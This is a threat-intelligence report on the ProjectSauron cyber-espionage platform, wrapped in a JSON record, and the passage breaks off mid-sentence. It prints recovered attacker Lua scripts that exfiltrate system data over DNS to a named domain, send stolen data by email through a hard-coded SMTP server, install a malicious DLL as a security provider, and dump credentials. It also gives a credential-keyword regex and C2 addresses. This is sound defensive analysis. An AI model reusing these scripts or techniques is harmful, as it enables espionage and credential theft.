{
    "id": "edd9a660-fd95-47e0-a7d1-8d5d00d5459e",
    "created_at": "2022-10-25T16:48:13.589398Z",
    "updated_at": "2025-03-27T02:16:55.421358Z",
    "deleted_at": null,
    "sha1_hash": "a510a638576efbbd0eb7b5fa7dbce838ddde290b",
    "title": "",
    "authors": "",
    "file_creation_date": "2016-08-08T20:06:58Z",
    "file_modification_date": "2016-08-08T20:06:58Z",
    "file_size": 602269,
    "plain_text": "# THE PROJECTSAURON APT\n\n### Global Research and Analysis Team \n\n\n-----\n\n## Table of Contents\n\nTable of Contents .............................................................................................................................................. 2\n\nExecutive summary............................................................................................................................................ 3\n\nVictims ............................................................................................................................................................... 5\n\nTechnical Summary ........................................................................................................................................... 6\n\nMalware Deployment ........................................................................................................................................ 7\n\nJumping over the Air-Gap .................................................................................................................................. 8\n\n“VirtualEncryptedNetwork” .............................................................................................................................. 9\n\nNetwork exfiltration ........................................................................................................................................ 10\n\nLUA .................................................................................................................................................................. 13\n\nVFS Structure ................................................................................................................................................... 15\n\nC2 Infrastructure ............................................................................................................................................. 16\n\nAttribution ....................................................................................................................................................... 17\n\nConclusions ...................................................................................................................................................... 21\n\n\n-----\n\n## Executive summary \n\nIn September 2015, Kaspersky Lab’s Anti-Targeted Attack Platform discovered anomalous network traffic in\na government organization network. Analysis of this incident led to the discovery of a strange executable\nprogram library loaded into the memory of the domain controller server. The library was registered as a\nWindows password filter and had access to sensitive data such as administrative passwords in cleartext.\nAdditional research revealed signs of activity of a previously unknown threat actor, responsible for largescale attacks against key governmental entities.\n\nThe name, ‘ProjectSauron’ reflects the fact that the code authors refer to ‘Sauron’ in the configuration files.\n\nThe threat actor behind ProjectSauron commands a top-of-the-top modular cyber-espionage platform in\nterms of technical sophistication, designed to enable long-term campaigns through stealthy survival\nmechanisms coupled with multiple exfiltration methods. Technical details show how attackers learned from\nother extremely advanced actors in order to avoid repeating their mistakes. As such, all artifacts are\ncustomized per given target, reducing their value as indicators of compromise for any other victim.\n\nUsually APT campaigns have a geographical nexus, aimed at extracting information within a specific region\nor from a given industry. That usually results in several infections in countries within that region, or in the\ntargeted industry around the world. Interestingly, ProjectSauron seems to be dedicated to just a few\ncountries, focused on collecting high value intelligence by compromising almost all key entities it could\npossibly reach within the target area.\n\n#### This paper in a nutshell\n\n#####  ProjectSauron is a modular platform designed to enable long-term cyber-espionage campaigns.\n\n  All modules and network protocols use strong encryption algorithms, such as RC6, RC5, RC4,\nAES, Salsa20, etc.\n\n#####  ProjectSauron uses a modified LUA scripting engine to implement the core platform and its\nplugins. There are more than 50 different plugin types.\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 3 of 22\n\n\n-----\n\n#####  ProjectSauron has high interest in communication encryption software widely used by targeted\ngovernmental organisations. It steals encryption keys, configuration files, and IP addresses of\nthe key infrastructure servers related to the software.\n\n#####  ProjectSauron is able to exfiltrate data from air-gapped networks by using specially-prepared\nUSB storage drives where data is stored in an area invisible to the operating system.\n\n#####  The platform makes extensive use of the DNS protocol for data exfiltration and real-time status\nreporting.\n\n#####  The APT has been operational since at least June 2011 and was still active in 2016.\n\n  The initial infection vector used to penetrate victim networks remains unknown.\n\n  The attackers utilize legitimate channels of software distribution for lateral movement within\ninfected networks.\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 4 of 22\n\n\n-----\n\n## Victims\n\nUsing our telemetry, we found more than 30 infected organizations in Russia, Iran and Rwanda, and there\nmay be some in Italian-speaking countries. Many more organizations and geographies are likely to be\naffected.\n\nThe organizations attacked are key entities that provide core state functions:\n\n#####  Government\n\n  Scientific research centers\n\n  Military\n\n  Telecommunication providers\n\n  Finance\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 5 of 22\n\n\n-----\n\n## Technical Summary\n\nWhat follows is a summary of the most interesting and unique features of ProjectSauron:\n\n1. ProjectSauron usually registers its persistence module on domain controllers as a Windows LSA (Local\n\nSystem Authority) password filter. This feature is typically used by system administrators to enforce\npassword policies and validate new passwords to match specific requirements, such as length and\ncomplexity. This way, the ProjectSauron passive backdoor module starts every time any domain, local\nuser, or administrator logs in or changes a password, and promptly harvests the passwords in plaintext.\n\n2. In cases where domain controllers lack direct Internet access, the attackers install additional implants\n\non other intranet servers likely to have both Internet access and at the same time generate a lot of\nnetwork traffic, such as proxy­servers, web­servers, or software update servers. After that, these\nintermediary servers are used by ProjectSauron as internal proxy nodes for silent and inconspicuous\ndata exfiltration, blending in with high volumes of other legitimate traffic.\n\n3. Once installed, the main ProjectSauron modules start working as ‘sleeper cells’, displaying no activity of\n\ntheir own and waiting for ‘wake­up’ commands in the incoming network traffic. This method of\noperation ensures ProjectSauron’s extended persistence on the servers of targeted organizations.\n\n4. Most of ProjectSauron’s core implants are designed to work as backdoors, downloading new modules\n\nor running commands from the attacker purely in memory. The only way to capture these modules is\nby making a full memory dump of the infected systems.\n\n5. Secondary ProjectSauron modules are designed to perform specific functions like stealing documents,\n\nrecording keystrokes, and hijacking encryption keys from both infected computers and attached USB\nsticks.\n\n6. Almost all of ProjectSauron’s core implants are unique, have different file names and sizes, and are\n\nindividually built for each target. Each module’s timestamp, both in the file system and in its own\nheaders, is tailored to the environment into which it is installed.\n\n7. ProjectSauron implements a modular architecture using its own virtual file system to store additional\n\nmodules (plugins) and a modified LUA interpreter to execute internal scripts. There are more than 50\ndifferent plugin types.\n\n8. ProjectSauron works on all modern Microsoft Windows operating systems - both x64 and x86. We have\n\nwitnessed infections running on Windows XP x86 as well as Windows 2012 R2 Server Edition x64.\n\n9. ProjectSauron has extensive network communication abilities using full stacks of the most common\n\nnetwork protocols: ICMP, UDP, TCP, DNS, SMTP, and HTTP.\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 6 of 22\n\n\n-----\n\n## Malware Deployment\n\nIn several cases, ProjectSauron modules were deployed through the modification of scripts used by system\nadministrators to centrally deploy legitimate software updates within the network.\n\nIn essence, the attackers injected a command to start the malware by modifying existing software\ndeployment scripts. The injected malware is a tiny module (4-5 Kb) that works as a simple downloader. Once\nstarted on the target computers under a network administrator account, the downloader connects to the\nhard-coded internal or external IP address and downloads the ProjectSauron payload from there.\n\nIn cases where the ProjectSauron VFS container is stored on disk in EXE file format, it disguises the files with\nlegitimate software file names, for example:\n\n**Vendor that uses similar filenames** **Disguised malware filename**\n\nKaspersky Lab kavupdate.exe, kavupd.exe\n\nSymantec SsaWrapper.exe, symnet32.dll\n\nMicrosoft KB2931368.exe\n\nHewlett-Packard hptcpprnt.dll\n\nVmWare VMwareToolsUpgr32.exe\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 7 of 22\n\n|Vendor that uses similar filenames|Disguised malware filename|\n|---|---|\n|Kaspersky Lab|kavupdate.exe, kavupd.exe|\n|Symantec|SsaWrapper.exe, symnet32.dll|\n|Microsoft|KB2931368.exe|\n|Hewlett-Packard|hptcpprnt.dll|\n|VmWare|VMwareToolsUpgr32.exe|\n\n\n-----\n\n## Jumping over the Air-Gap\n\nThe ProjectSauron toolkit contains a special module designed to move data from air­gapped networks to\nInternet-connected systems. To achieve this, removable USB devices are used. Once networked systems are\ncompromised, the attackers wait for a USB drive to be attached to the infected machine.\n\nThese USBs are specially formatted to reduce the size of the partition on the USB disk, reserving an amount\nof hidden data (several hundred megabytes) at the end of the disk for malicious purposes. This reserved\nspace is used to create a new custom-encrypted partition that won’t be recognized by a common OS, such\nas Windows. The partition has its own semi-filesystem (or virtual file system, VFS) with two core directories:\n‘In’ and ‘Out’.\n\nThis method also bypasses many DLP products, since software that disables the plugging of unknown USB\ndevices based on DeviceID wouldn't prevent an attack or data leakage because a genuine recognized USB\ndrive was used.\n\nWhen penetrating isolated systems, the sole creation of the encrypted storage area in the USB does not\nenable attackers to get control of the air-gapped machines. There has to be another component such as a\nzero­day exploit placed on the main partition of the USB drive. Unfortunately we haven’t found any zeroday exploit embedded in the body of any of the malware we analyzed, and we believe it was probably\ndeployed in rare, hard-to-catch instances.\n\n[For more information, please see the ‘MyTrampoline’ section of ‘Technical Analysis’ for technical details.](https://kas.pr/LrB6)\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 8 of 22\n\n\n-----\n\n## “VirtualEncryptedNetwork”\n\nProjectSauron actively searches for information related to a rather uncommon, custom network encryption\nsoftware. This client-server software is widely adopted by many of the target organizations to secure\ncommunications, voice, email, and document exchange. To avoid possible victim attribution implications\nbased on the real name of the software, we refer to it as “VirtualEncryptedNetwork” (further abbreviated as\nVEN).\n\nIn a number of cases we analyzed, ProjectSauron deployed malicious modules inside VEN's software\ndirectory, disguised under similar filenames, accessing the data placed besides its own executable. Decrypted\nLUA scripts show that the attackers have a high interest in installed VEN components, encryption keys, virtual\nnetwork configuration files, and the location of servers that relay encrypted messages between the nodes:\n\n**local t = w.exec2str(\"regedit -a \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\VirtualEncryptedNetwork\\\\Components\\\" |grep -i** _[sni_\n**local r = w.exec2str(\"cat \\\"\"** .. l_3_0 .. \"settings.cfg\" | grep -i \" .. t)\nw.exec(\"dir /s /b ap*.txt link*.txt node*.tun VirtualEncryptedNetwork.licence VirtualEncryptedNetworkEMail.key VirtualEnc\n\nAlso, one of the embedded ProjectSauron configurations contains a special unique identifier for the targeted\nserver (targetid DWORD) within the VEN network.\n\nInteresting behavior was found in the component that searched for VEN´s server IP address. After getting the\nIP, the ProjectSauron component tries to communicate with the remote server using its own (ProjectSauron)\nprotocol as if it was yet another C&C server. This suggests that some of VEN communication servers could\nalso be infected with ProjectSauron.\n\ntargetId 0D3F0454\n\nsourcePort 60439\n\ntargetPort 5003\n\nlistenPort 5010\n\nAfter collecting and exfiltrating VEN-related data, ProjectSauron components securely self-remove:\n\ne = s.format(\"move -O FakeVirtualEncryptedNetwork.dll FakeVirtualEncryptedNetwork.dl_\")\nw.exec(e)\ne = s.format(\"wipe FakeVirtualEncryptedNetwork.dl_\")\nw.exec(e)\ne = s.format(\"rbswap FakeVirtualEncryptedNetwork.dl_\")\nw.exec(e)\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 9 of 22\n\n\n-----\n\n## Network exfiltration\n\nProjectSauron uses a number of ways to hide both data exfiltration and the way it receives new commands\nor modules. In addition to common ways to exfiltrate data via direct communication with C2s or its\nintermediate proxies using standard protocols (see [‘Technical Analysis’), ProjectSauron utilizes a few](https://kas.pr/LrB6)\nuncommon techniques to exfiltrate data:\n\n#####  Tunneling over DNS\n\n  Email \n\n### DNS\n\nOne of the plugins we analyzed was internally named ‘DEXT’, which probably stands for DNS exfiltration tool.\nTo avoid generic detection of DNS tunnels at network level, the attackers used it in low-bandwidth mode,\nwhich is why it was used solely to exfiltrate target system metadata:\n\ndomain = \"bikessport[.]com\"\nexecStr = string.format(\"sinfo | basex -b 32url | dext -l 30 a.\" .. domain .. \" | nslu -\")\nres = w.exec2str(execStr)\n\nThe example above shows the following ProjectSauron steps written in a LUA script:\n\n1. Collect common system information using a tool called sinfo\n\n2. Encode the info into BASE64-format (basex)\n\n3. Generate a set of DNS packets to a.bikessport[.]com domain with transferred payload chunks of\n\n30 bytes per packet (dext)\n\n4. Send generated DNS packets one by one using nslu tool\n\nThe same approach is used by another script to exfiltrate network configuration information\n\nexecStr = string.format(\"netnfo -irc | basex -b 32url | dext -l 30 c.\" .. domain .. \" | nslu -\")\nres = w.exec2str(execStr)\nexecStr = string.format(\"regedit -a \\\"\\\\HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\" |\nbasex -b 32url | dext -l 30 d.\" .. domain .. \" | nslu -\")\nres = w.exec2str(execStr)\n\nAnother interesting feature in ProjectSauron that leverages the DNS protocol is the real-time reporting of\n**the operation progress to a remote server. Once an operational milestone is achieved, ProjectSauron issues**\na DNS-request to a special subdomain, which is unique to each target:\n\ndomain = \"j.bikessport[.]com\"\nexecStr = string.format(\"nslu yhc9421.\" .. domain)\nw.exec2str(execStr)\nw.exec(\"sinfo\")\nw.exec(\"wfw status\")\nexecStr = string.format(\"nslu yhc9422.\" .. domain)\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 10 of 22\n\n\n-----\n\nw.exec2str(execStr)\nw.exec(\"dinst\")\nw.exec(\"pstoredi\")\nexecStr = string.format(\"nslu yhc9452.\" .. domain)\nw.exec2str(execStr)\nw.exec(\"samdump\")\nw.exec(\"netx -f\")\nw.exec(\"w3get -s http://ipchicken.com/index.php\")\nexecStr = string.format(\"nslu yhc9472.\" .. domain)\n\n### Email\n\nWhile we have previously seen malware using email as a data exfiltration method, i.e. [Kimsuky](https://securelist.com/analysis/publications/57915/the-kimsuky-operation-a-north-korean-apt/)\n[or BlueTermite](https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/) APT, ProjectSauron APT uses this channel slightly differently.\n\nFirst, ProjectSauron generates a proper MIME email message that looks identical to an email generated by a\ncommon email client software. Moreover, it inserts mailer application information, \"Thunderbird 2.0.0.9\n**(Windows/20071031)\" in this case. Email body is a short text message with a unsuspicious subject and a**\n‘data.bin’ binary attachment encoded with Base64. The attachment may look like unknown benign data in\nunrecognized format but of course it contains stolen data in encrypted form. The email addresses, message\nsubject and email body are individually selected to each target and are never reused.\n\nNext, ProjectSauron connects directly to an external SMTP server by using a hard-coded IP (i.e. Google mail\nserver) to send the email. In cases where direct connections to an external mail server are not allowed in the\ntarget network, ProjectSauron searches for an authorized local email server in the protected virtual network\nby parsing configuration of VEN software and then uses it to send a copy of the email in case of direct\nconnection failure.\n\n**externalmail =** \"74.125.148.11\" //Google mail server\n...\nmailto = \"xxx.xxx.xxx@gmail.com\"\nmailSubject = \"Regarding your offer\"\nmailBody = \"This is to inform you that I decline your offer. See attachment.\\n Best Regards xxxxx\"\nsmtpport = \"\"\nsmtpserver = \"\"\n...\nbuffer = string.format(\"%sMessage-ID: <%s.%s@localhost.localdomain>%s\", buffer, id1, id2, endOfRow)\nbuffer = string.format(\"%sFrom: <%s>%s\", buffer, l_1_1, endOfRow)\nbuffer = string.format(\"%sUser-Agent: Thunderbird 2.0.0.9 (Windows/20071031)%s\", buffer, endOfRow)\nbuffer = string.format(\"%sMIME-Version: 1.0%s\", buffer, endOfRow)\nbuffer = string.format(\"%sTo: %s%s\", buffer, l_1_0, endOfRow)\nbuffer = string.format(\"%sSubject: %s%s\", buffer, l_1_2, endOfRow)\n...\nregStr = w.exec2str(\"cat VirtualEncryptedNetwork.ini|grep -i \\\"pop|smtp\")\n**for k,v in** string.gmatch(regStr, \"(%w+)=([%w,%. ]*)\") **do**\n**if** string.lower(k) == \"smtpserver\" **then**\n**smtpserver** = v\n**end**\n**if** string.lower(k) == \"smtpport\" **then**\nsmtpport = v\n**end**\n**end**\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 11 of 22\n\n\n-----\n\n...\nslask = mail(mailto, mailto, mailSubject, mailBody, log)\nslask2 = w.exec2str(\"smtpsend \" .. **externalmail ..** \" \" .. mailto .. \" \" .. mailto, slask)\nw.debugf(slask2)\nslask2 = w.exec2str(\"smtpsend \" .. **smtpserver ..** \" \" .. mailto .. \" \" .. mailto, slask)\nw.debugf(slask2)\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 12 of 22\n\n\n-----\n\n## LUA\n\nThe use of a LUA interpreter allowed the attackers to operate with flexibility by writing a simple LUA script\nfor a target machine. The original LUA interpreter was modified by the attackers to support Unicode (UTF16) string encoding.\n\nBelow is an example of such a script used to install ProjectSauron modules onto the system:\n\ndomain = \"bikessport[.]com\"\ndllName = \"msprtssp.dll\"\n\ninstall_zeta2 = **function()**\n\nwindir = os.getenv(\"WINDIR\")\nexecStr = string.format(\"put2 zeta2dll \\\"%s\\\\SYSTEM32\\\\%s\\\"\", windir, dllName)\nres = w.exec2str(execStr)\n**if** string.find(res, \"kb/sec\") == nil **then**\nw.printf(\"put2 failed\\n%s\\n\", res)\n**return** false\n**end**\n\nexecStr = string.format(\"nslu gc3220.\" .. domain)\nw.exec2str(execStr)\nregwrite = false\nregStr = w.exec2str(\"regedit -r \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\"| grep -i\nSecurityProviders\")\nw.printf(\"regStr %s\\n\", regStr)\n\n**for k,v in** string.gmatch(regStr, \"\\\"(%w+)\\\"=\\\"([%w,%. ]*)\\\"\") **do**\nw.printf(\"k=%s, v= %s\\n\", k, v)\n**if** string.lower(k) == \"securityproviders\" **then**\n**if** string.len(v)      - 0 **then**\nvalue = string.format(\"%s, %s\", v, dllName)\n**else**\nvalue = string.format(\"%s\", dllName)\n**end**\n**if** **not** string.find(v, dllName, 1, true) **then**\nstdIn = string.format(\"Windows Registry Editor Version\n5.00\\n\\n[HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders]\\n\\\"SecurityProviders\\\"=\\\"%s\\\n**\"\", value)**\nw.printf(\"\\n\\nstdIn\\n%s\\n\", stdIn)\nout = w.exec2str(\"regedit -i\", stdIn)\nw.printf(\"\\n\\nout\\n%s\\n\", out)\n**else**\nw.printf(\"Found dllName\\n\")\n**end**\nregwrite = true\n**end**\n**end**\n**if regwrite ==** true **then**\nexecStr = string.format(\"ftime -c \\\"%s\\\\SYSTEM32\\\\ntdll.dll\\\" **\\\"%s\\\\SYSTEM32\\\\%s\\\"\", windir, windir, dllName)**\nres = w.exec2str(execStr)\nw.printf(\"%s\\n\", res)\nexecStr = string.format(\"nslu gc3221.\" .. domain)\nw.exec2str(execStr)\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 13 of 22\n\n\n-----\n\n**end**\n**return regwrite**\n**end**\n\nz2res = install_zeta2()\n\n**if** **not z2res then**\nw.printf(\"Installation failed\\n\")\nexecStr = string.format(\"nslu xxc3222.\" .. domain)\nw.exec2str(execStr)\n**else**\nstr = w.exec2str(\"plist -b | grep netsvcs\")\npid = string.match(str, \"%w* (%d+) %w*\")\nw.debugf(\"Pid %d\\n\", pid)\nw.exec2str(string.format(\"pkill %d\", pid))\nw.printf(\"Installation done\\n\")\nexecStr = string.format(\"nslu ooc3222.\" .. domain)\nw.exec2str(execStr)\n**end**\n\nMore LUA examples are shown in ‘Technical Analysis’.\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 14 of 22\n\n\n-----\n\n## VFS Structure\n\nThe VFS can have both a linear and a two-level hierarchical view. In the case of a two-level hierarchical view,\none of the levels contains the data responsible for process injection, data stealing and storing it into the local\nProjectSauron cache, and the second structure contains the data for exfiltration and external network\ncommunications. In the case of a linear view, all types of modules are located on a single level.\n\nCuriously, in many cases the same plugins are found in both the VFS upper and lower levels.\n\nTypically, a local cache of stolen files is located within the **C:\\System** **Volume**\n**Information\\_restore{ED650925-A32C-4E9C-8A73-8E6F0509309A} folder, and keylogging results are stored**\nin %WINDIR%\\Temp\\ folder under the names ‘bka*.da’ or ‘~*.tmp’.\n\nThe VFS has some pre-defined packages of plugins called ‘blobs’.\n\nThe minimal set of plugins for process injection and stored data exfiltration is called kblog.blob and consists\nof the following modules:\n\n#####  detach\n\n  ilpsend\n\n  dir\n\n  skip \n\nIn some cases, there exists an ‘extended’ package variant used that redirects the exfiltration data stream\nthrough its own local proxy-server and wipes sent documents upon completion. The extended variant\ncontains the following modules:\n\n#####  kgate\n\n  knatt\n\n  wipe \n\nInterestingly, there is no automatic wiping of the documents sent to the server in the ‘minimal’ package. It’s\nassumed that this task should be carried out by second LUA-script (in the case of a hierarchical VFS - the\nparent or child). However, this assumption is not met in all cases. This means that in such cases the stolen\ndocuments are not removed and remain stored in the ProjectSauron cache forever, which suggests a design\nflaw.\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 15 of 22\n\n\n-----\n\n## C2 Infrastructure\n\nThe ProjectSauron actor is extremely well prepared when it comes to operational security. Running an\nexpensive cyberespionage campaign like ProjectSauron requires vast domain and server infrastructure\nuniquely assigned to each victim organization and never again reused. This makes traditional network-based\nindicators of compromise useless because they are never reused in any other organization.\n\nWe collected 28 domains linked to 11 IPs located in the United States and several European countries that\nmight be connected to ProjectSauron campaigns.\n\n**IP** **ISP**\n\n104.131.61.33 Digital Ocean, Inc., US\n\n176.9.242.188 Closco Ltd, Germany\n\n185.78.64.121 MM ONE Group Srl, Italy\n\n192.195.77.59 1&1 Internet Inc., US\n\n216.250.114.149 1&1 Internet Inc., US\n\n217.160.176.157 1&1 Internet AG, Germany\n\n37.252.125.88 Tilaa, The Netherlands\n\n54.209.129.218 Amazon AWS, US\n\n66.228.52.133 Linode, US\n\n81.4.108.168 RamNode, The Netherlands\n\n83.125.22.161 AttractSoft GmbH, Germany\n\nEven the diversity of ISPs selected for ProjectSauron operations makes it clear that the actor did everything\npossible to avoid creating patterns. Unfortunately, little is known about these servers.\n\nThe list of ProjectSauron domains follows (domains in bold were extracted from malware, the rest were\nfound via Passive DNS and are not validated):\n\nad-consult.cc easterncredit.net **ping.sideways.ru**\nart-irisarns.com **flowershop22.110mb.com** rapidcomments.com\n**bikessport.com** gtf.cc sba-messebau.at\nchirotherapie.at iut.hcmut.edu.vn utc-wien.at\n**csrv01.rapidcomments.com** liebstoecklco.at weingut-haider-malloth.at\ndee.hcmut.edu.vn lydia-leydolf.at **wildhorses.awardspace.info**\nder-wein.at mail.mbit-web.com windward-trading.biz\ndievinothek.net mbit-web.com winnie-andersen.com\ndisplay24.at mycruiseship.net\ndr-rauch.com **myhomemusic.com**\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 16 of 22\n\n|IP|ISP|\n|---|---|\n|104.131.61.33|Digital Ocean, Inc., US|\n|176.9.242.188|Closco Ltd, Germany|\n|185.78.64.121|MM ONE Group Srl, Italy|\n|192.195.77.59|1&1 Internet Inc., US|\n|216.250.114.149|1&1 Internet Inc., US|\n|217.160.176.157|1&1 Internet AG, Germany|\n|37.252.125.88|Tilaa, The Netherlands|\n|54.209.129.218|Amazon AWS, US|\n|66.228.52.133|Linode, US|\n|81.4.108.168|RamNode, The Netherlands|\n|83.125.22.161|AttractSoft GmbH, Germany|\n\n|ad-consult.cc art-irisarns.com bikessport.com chirotherapie.at csrv01.rapidcomments.com dee.hcmut.edu.vn der-wein.at dievinothek.net display24.at dr-rauch.com|easterncredit.net flowershop22.110mb.com gtf.cc iut.hcmut.edu.vn liebstoecklco.at lydia-leydolf.at mail.mbit-web.com mbit-web.com mycruiseship.net myhomemusic.com|ping.sideways.ru rapidcomments.com sba-messebau.at utc-wien.at weingut-haider-malloth.at wildhorses.awardspace.info windward-trading.biz winnie-andersen.com|\n|---|---|---|\n\n\n-----\n\n## Attribution\n\nAttribution is hard and reliable attribution is rarely possible in cyberspace. Even with confidence in various\nindicators and apparent attacker mistakes, there is a greater likelihood that these can all be smoke and\nmirrors created by an attacker with a greater vantage point and vast resources. When dealing with the most\nadvanced threat actors, as is the case with ProjectSauron, attribution becomes an unsolvable problem.\n\nRather than speculate on the perpetrators behind such a sophisticated attack, we instead highlight a few\nrelevant observations made during analysis.\n\n### Language Use\n\nAll human-written text is in English.\n\nCore scenarios that orchestrated ProjectSauron modules were written in LUA, a computer language that\ntraditionally doesn't support the UTF-16 character set for string operations. However, the target systems had\nsome local paths in a non-Latin character set thus creating the requirement to extend LUA to support UTF16, which the developers of ProjectSauron did. This suggests that originally the ProjectSauron developers\nworked and tested their code on systems with a Latin character set and only after deploying it in a real-world\nscenario found LUA’s features deficient. Instead of scraping their interpreter of choice, they decided to\nmodify it to implement the missing features.\n\nOne of the configuration files we extracted contained a list of file extensions and keywords that contain\nItalian words:\n\n.*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*|.*user.*|.*name|.*email|.*_id|id|uid|mn|mailaddress|.*nick.*|alias|\ncodice|uin|sign-in|strCodUtente|.*pass.*|.*pw|pw.*|additional_info|.*secret.*|.*segreto.*\n\nThe italian keywords and filenames targeted by ProjectSauron data theft modules can be translated as\nfollowing:\n\nItalian keyword Translation\n\nCodice code\n\nCodUtente Usercode\n\nSegreto Secret\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 17 of 22\n\n\n-----\n\nMost ProjectSauron modules contain standard embedded usage output in proficient English, i.e.\n\n\n**arping module**\n\n\n-r  Resolve hosts that answer.\n-l  Print only replying Ips.\n-m  Do not display MAC addresses.\n\nThis looks like a very traditional Unix-way of outputting simple command help/usage.\n\nHowever, there is no common style of outputting module usage and it varies from module to module. Here\nis an example of a different usage output:\n\n\n**kblogi module**\n\n\nkblogi [options]\nOptions:\nkblogi\n-p proc  Inject using process name or pid. Default \"explorer.exe\".\n-c file  Convert mode: Read log from file and convert to text.\n-t sec   Maximum running time in seconds\n-v     Verbose mode\n**-?     Displays this usage information.**\n\nWhile it may look similar to the previous usage output an experienced user would recognize the difference:\nit looks more like a usage of command from Windows. The option ‘-?’ is rarely seen in the Unix world, optional\nparameters are enclosed with ‘[‘ and ‘]’ characters, mandatory parameters are enclosed with ‘<’ and ‘>’, etc.\n\nThe following example of usage output is indicative of an experienced Unix user with proper formatting:\n\n\n**basex module**\n\n\nbasex [-b <base>] [-d [-f]] [-h]\nOptions:\n-b base 64, 64url, 32, 32url or 16. Default is 64\n-d    Decode data. Default is to encode\n-f    Force decoding when input is invalid/corrupt\n**-h    This cruft**\nUses standard in/out. See man page for examples.\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 18 of 22\n\n\n-----\n\nIt seems that the same developer created several tools, as indicated by further identical-style usage\nformatting.\n\n\n**DNS Exfiltration module (dext)**\n\n\ndext [options] suffix\nOptions:\n-a    Assemble rows of DNS names back to a single string of data\n-f    Force - removes checks of DNS names and lengths (during split)\nand missing/wrapped data (during assembly)\n-l length Specify length of data part of suffix (default and max is %d)\n-r    Randomize data lengths (length/2 to length)\n**-h    This cruft**\nSuffix format: domain.com\n**See man page for examples.**\n\nThere is a noteworthy reference to a ‘man page’, a term for standard Unix manuals. Another unique language\nfeature is usage of \"This cruft\" for the -h option. The term cruft is rarely used by non-native speakers and\n[actually has a Wikipedia](https://en.wikipedia.org/wiki/Cruft) article to explain its use:\n\n_\"Cruft is jargon for anything that is left over, redundant and getting in the way. It is used particularly for_\n_superseded and unused technical and electronic hardware and useless, superfluous or dysfunctional_\n_elements in computer software.\"_\n...\n\"Around 1958, the term was used in the sense of \"garbage\" by students frequenting the MIT Tech Model\n_Railroad Club.\"_\n_..._\n_\"The FreeBSD handbook uses the term to refer to leftover or superseded object code that accumulates in a_\n_folder or directory when software is recompiled and new executables and data files produced.\"_\n\nOlder versions of software in the *BSD world, such as cryptcat or netcat (a very common universal network\nclient/server tool for network testing) used identical option descriptions:\n\n**Netcat tool usage, Apple Mac OS, 1999** **Cryptcat tool usage, KALI Linux, 2014**\n\n... …\n-g gateway  source-routing hop point[s], up to 8 -g gateway   source-routing hop point[s], up to 8\n-G num      source-routing pointer: 4, 8, 12, ... -G num     source-routing pointer: 4, 8, 12, ...\n**-h           this cruft** **-h     this cruft**\n... ...\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 19 of 22\n\n|Netcat tool usage, Apple Mac OS, 1999|Cryptcat tool usage, KALI Linux, 2014|\n|---|---|\n|... -g gateway source-routing hop point[s], up to 8 -G num source-routing pointer: 4, 8, 12, ... -h this cruft ...|… -g gateway source-routing hop point[s], up to 8 -G num source-routing pointer: 4, 8, 12, ... -h this cruft ...|\n\n\n-----\n\nIn fact, this unique way to comment the ‘-h’ option is mostly found in netcat-derivative projects based on the\noriginal netcat developed by an old-school hacker known as ‘hobbit’ (hobbit@avian.org)[1], who first released\nthe netcat source code back in 1995. Hobbit used the word \"cruft\" four times in the netcat110 source code\nfrom 1996:\n\n/* timeout and other signal handling cruft */\n**-h** **this cruft\\n\\**\n### and have \"xxx.bat\" that types out all the cruft for %INCLUDE%\\%1.\n# compiler cruft??\n\nHowever, we do not believe that hobbit can be in any way related to the development of ProjectSauron\nmodules. The more likely explanation is that the developers of the ProjectSauron modules are also old school\nhackers that develop advanced tools and use \"this cruft\" as a tribute to old and stable tools.\n\n1 Hobbit's personal page is at http://techno-fandom.org/~hobbit/\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 20 of 22\n\n\n-----\n\n## Conclusions\n\nEvery APT attack we analyze brings with it some new knowledge about the nature of cyberespionage. The\nattackers are hackers first and foremost and, as proficient hackers, they invent novel ways to get into a\nnetwork, do lateral movement, leave nearly no traces, all while exfiltrating valuable data.\n\nProjectSauron is a very advanced actor, comparable only to the top-of-the-top in terms of sophistication:\nalongside Duqu, Flame, Equation, and Regin. Whether related or unrelated to these advanced actors, the\nProjectSauron attackers have definitely learned from these others.\n\nAs a reminder, here are some features of other APT attackers that ProjectSauron attackers had carefully\nlearned from or emulated:\n\nDuqu:\n\n#####  Use of intranet C2s (that compromised target servers may act as independent C2s)\n\n  Running only in memory (persistence on a few gateway hosts only)\n\n  Use of different encryption methods per victim\n\n  Use of named pipes for LAN communication\n\n  Malware distribution through legitimate software deployment channels\n\nFlame:\n\n#####  LUA-embedded code\n\n  Secure file deletion (through data wiping)\n\n  Attacking air-gapped systems via removable devices\n\nEquation and Regin:\n\n#####  Usage of RC5/RC6 encryption \n\n  Virtual Filesystems (VFS)\n\n  Attacking air-gapped systems via removable devices\n\n  Hidden data storage on removable devices\n\nThese other actors also 